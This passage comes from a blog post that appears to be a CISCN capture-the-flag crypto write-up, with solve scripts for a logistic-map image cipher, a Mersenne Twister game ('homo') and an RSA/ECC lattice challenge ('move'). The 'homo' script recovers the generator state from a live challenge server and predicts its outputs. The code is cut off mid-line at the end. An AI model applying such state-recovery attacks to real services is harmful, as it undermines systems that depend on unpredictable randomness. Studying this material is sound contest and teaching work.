class="line">        data = <span class="built_in">round</span>(data+<span class="number">0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(x_list[i]*<span class="number">22000</span>) == x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">x,r</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_r</span>(<span class="params">data</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    r = <span class="built_in">round</span>(data[<span class="number">0</span>] / <span class="built_in">round</span>((data[<span class="number">1</span>]*(<span class="number">3</span>-data[<span class="number">1</span>])),<span class="number">6</span>),<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;R:&quot;</span>,r)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(i,generate(data[i],r),data[i+<span class="number">1</span>],(generate(data[i],r)-data[i+<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">r = get_r(x_list)</span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span><br><span class="line">    num = m*n//<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x,r)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">finalplain = encrypt(cipher2,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="built_in">print</span>(finalplain)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44]</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44, 210, 63, 158, 223, 183, 161, 91, 36, 201, 53, 92, 222, 105, 246, 80, 94, 170, 10, 132, 110, 0, 151, 77, 91, 209, 110, 100, 206, 195, 88, 103, 183, 7, 98, 163, 42, 44, 115, 82, 184, 200, 122, 56, 188, 106, 159, 221, 166, 213, 81, 162, 64, 116, 213, 43, 32, 5, 223, 135, 182, 64, 54, 111, 218, 126, 75, 92, 205, 231, 15, 8, 66, 34, 52, 115, 246, 96, 227, 92, 211, 76, 204, 217, 20, 239, 144, 139, 90, 136, 142, 197, 83, 43, 96, 248, 76, 17, 70, 13, 49, 18, 69, 95, 31, 198, 181, 32, 119, 253, 42, 73, 70, 106, 29, 38, 20, 232, 108, 244, 219, 72, 144, 109, 146, 32, 250, 83, 99]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,finalplain))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+md5.new(data).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h4><p>拿312次随机数，就能还原<code>states</code>，接着预判接下来的200次<code>win</code>了之后即可<code>decrypt</code>，由于系数不能完全相同，给其加上个模数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> poly <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;124.71.229.150&quot;</span>, <span class="string">&quot;23474&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_coefficient</span>():</span><br><span class="line">    data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">    coefficient = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        coefficient.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">return</span> coefficient</span><br><span class="line"></span><br><span class="line">q = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">data1 = get_coefficient()</span><br><span class="line">data2 = get_coefficient()</span><br><span class="line">data3 = get_coefficient()</span><br><span class="line">data4 = get_coefficient()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RightXor</span>(<span class="params">value,shift,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RightXorMasked</span>(<span class="params">value,shift,mask,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LeftXor</span>(<span class="params">value, shift,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LeftXorMasked</span>(<span class="params">value, shift, mask,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_state</span>(<span class="params">x</span>):</span><br><span class="line">    x = RightXor(x,<span class="number">18</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">15</span>,<span class="number">4022730752</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">7</span>,<span class="number">2636928640</span>)</span><br><span class="line">    x = RightXor(x,<span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_game</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    my_states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">&quot;my number is &quot;</span>)</span><br><span class="line">        num = <span class="built_in">bin</span>(<span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode()))[<span class="number">2</span>:]</span><br><span class="line">        num1,num2 = <span class="built_in">int</span>(num[-<span class="number">32</span>:],<span class="number">2</span>),<span class="built_in">int</span>(num[:-<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">        my_states.append(get_state(num1))</span><br><span class="line">        my_states.append(get_state(num2))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(my_states) == <span class="number">624</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my_states ready!&quot;</span>)</span><br><span class="line">    my_random = Random()</span><br><span class="line">    my_random.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(my_states+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        x = my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">        r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">play_game()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Win!&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;c0:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data3)-<span class="number">1</span>):</span><br><span class="line">    r.send(<span class="built_in">str</span>(data3[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(data3[-<span class="number">1</span>]+q))</span><br><span class="line">r.recvuntil(<span class="string">&quot;c1:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data4)-<span class="number">1</span>):</span><br><span class="line">    r.send(<span class="built_in">str</span>(data4[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(data4[-<span class="number">1</span>]+q))</span><br><span class="line"></span><br><span class="line">finaldata = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> finaldata:</span><br><span class="line">    flag += i</span><br><span class="line">flag = <span class="built_in">int</span>(flag,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="move"><a href="#move" class="headerlink" title="move"></a>move</h4><p>根据题目有 $ex-yn&#x3D;y(p+q+1)-z$，且发现 $e$ 和 $N$ 比较小那么就可以造格子进行格基规约,这样就能求出 $x$ 和 $y&#x3D;ex&#x2F;&#x2F;n$ 那么余数<br>$$<br>\begin{aligned}<br>k&amp;&#x3D;y(p+q+1)-z\\<br>&amp;&#x3D;ex-ynk \\<br>&amp;&#x3D; y(p+q+1)-z \\<br>&amp;&#x3D; y(p+q+1) - zbound - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;&#x3D; y(p+q+1) + int(\frac{((p-q)y\cdot round(n^{0.25}))}{(3(p + q))}) - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;&#x3D;y((p+q+1) + \frac{(p-q)\cdot round(n^{0.25}))}{(3(p + q))}<br>\end{aligned}<br>$$<br>所以 $k$ 整除 $y$ ，这里我们设 $K&#x3D;\frac{k}{y}&#x3D;\frac{(p+q+1) + ((p-q)\cdot round(n^{0.25}))}{(3*(p + q))}$ 我们设 $s&#x3D;p+q$ ，则 $p-q&#x3D;\frac{3s(K-1-s)}{round(n^{0.25})}$ ，根据 $(p+q)^2-(p-q)^2&#x3D;4n$ ，二分即可找到 $s$ ，接着算出 $d$ ，在ECC上进行标量乘法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p1, p2</span>):</span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">n, p</span>):</span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span 